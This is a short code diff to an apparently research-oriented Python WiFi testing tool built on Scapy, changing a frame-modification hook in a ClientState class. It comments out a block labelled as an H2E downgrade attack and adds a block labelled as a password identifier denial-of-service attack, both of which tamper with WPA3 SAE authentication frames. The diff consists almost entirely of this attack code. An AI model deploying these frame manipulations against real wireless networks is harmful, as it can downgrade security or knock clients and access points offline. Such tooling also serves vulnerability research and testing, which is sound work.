@@ -284,14 +284,26 @@ class ClientState():
 		As an example, in the FragAttacks this function was used to set the A-MSDU flag of
 		selected frames towards the client
 		"""
-		if Dot11Auth in p and p.addr1 == self.macaddr and bytes(p[Dot11Auth].payload)[:2] == b'\x14\x00':
-			p[Dot11Auth] = Dot11Auth(algo=3, seqnum=1, status=77)
-			p /= Raw(load=bytes.fromhex("1400"))
-		elif Dot11Auth in p and p.addr2 == self.macaddr and bytes(p[Dot11Auth].payload)[:2] == b'\x13\x00':
+		#--------- H2E DOWNGRADE ATTACK ---------------#
+		# if Dot11Auth in p and p.addr1 == self.macaddr and bytes(p[Dot11Auth].payload)[:2] == b'\x14\x00':
+		# 	p[Dot11Auth] = Dot11Auth(algo=3, seqnum=1, status=77)
+		# 	p /= Raw(load=bytes.fromhex("1400"))
+		# elif Dot11Auth in p and p.addr2 == self.macaddr and bytes(p[Dot11Auth].payload)[:2] == b'\x13\x00':
+		# 	modify = bytes(p[Dot11Auth].payload)
+		# 	before = modify[:-4]
+		# 	after = modify[-3:]
+		# 	p[Dot11Auth].payload = Raw(load=(before + b'\x03\x5c\x14'))
+		#--------- H2E DOWNGRADE ATTACK ---------------#
+
+		#--------- PASSWORD IDENTIFIER DOS ATTACK ---------------#
+
+		if Dot11Auth in p and p.addr2 == self.macaddr and p[Dot11Auth].seqnum == 1:
+			print(True, self.macaddr)
 			modify = bytes(p[Dot11Auth].payload)
-			before = modify[:-4]
-			after = modify[-3:]
-			p[Dot11Auth].payload = Raw(load=(before + b'\x03\x5c\x14'))
+			p[Dot11Auth].payload = Raw(load=(modify + b'\xff\x02\x21\x00'))
+		
+
+		#--------- PASSWORD IDENTIFIER DOS ATTACK ---------------#
 
 		# By default, frames are not modified.
 		return p
